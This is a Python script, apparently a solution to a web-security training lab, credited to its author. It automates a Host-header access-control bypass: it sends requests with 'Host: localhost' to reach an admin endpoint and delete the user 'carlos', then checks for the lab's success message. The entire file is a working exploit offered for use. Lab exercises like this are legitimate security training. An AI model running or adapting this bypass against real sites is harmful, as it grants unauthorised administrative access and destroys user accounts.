import requests
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def delete_carlos(self):
        response = self.session.get(self.lab_url)
        cookies = {}
        for key, value in response.cookies.items():
            cookies[key] = value
        headers = {
            'Host': 'localhost'
        }
        self.session.get(self.lab_url + 'admin/delete?username=carlos', headers=headers, cookies=cookies)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.delete_carlos()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
